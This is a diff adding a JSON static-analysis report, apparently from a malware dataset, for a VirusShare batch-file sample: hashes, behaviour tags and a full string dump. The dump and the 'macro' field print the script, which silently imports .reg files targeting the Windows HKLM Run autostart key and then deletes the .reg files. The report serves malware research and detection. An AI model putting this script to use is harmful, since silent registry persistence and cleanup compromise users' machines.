@@ -1,0 +1,57 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Run": "May run an executable file or a system command",
+            "Windows": "May enumerate application windows"
+        },
+        "macro": "echo off\necho.\necho REGEDIT4 > c:\\regCrk.reg\necho [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]                                                       >> c:\\regCrk.reg\n:loop\nc:\\windows\\regedit -s c:\\regCrk.reg\necho.\necho.\necho.\nc:\\windows\\regedit -s aggiorna.reg\n:Exit\ncls\t\ngoto end\n:Res\ncls\n:end\ndel c:\\*.reg\ncls\nexit"
+    },
+    "filename": "VirusShare_78609e4d0ef2126b1d22f52f80e0da38",
+    "filesize": 356,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "78609e4d0ef2126b1d22f52f80e0da38",
+        "sha1": "11c2fdbabdcb0de48d69505c9aa219c7837f4bf7",
+        "sha256": "97ad2e65004cf09ccc7717d106a19885ef3e220857d037f7cac6289e97ee78f9"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "echo off",
+            "echo.",
+            "echo REGEDIT4 > c:\\regCrk.reg",
+            "echo [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]                                                       >> c:\\regCrk.reg",
+            ":loop",
+            "c:\\windows\\regedit -s c:\\regCrk.reg",
+            "echo.",
+            "echo.",
+            "echo.",
+            "c:\\windows\\regedit -s aggiorna.reg",
+            ":Exit",
+            "cls\t",
+            "goto end",
+            ":Res",
+            ":end",
+            "del c:\\*.reg",
+            "exit"
+        ],
+        "file": {
+            "c:\\windows\\regedit -s aggiorna.reg": "Registry",
+            "c:\\windows\\regedit -s c:\\regCrk.reg": "Registry",
+            "del c:\\*.reg": "Registry",
+            "echo REGEDIT4 > c:\\regCrk.reg": "Registry",
+            "echo [HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]                                                       >> c:\\regCrk.reg": "Registry"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.268228",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
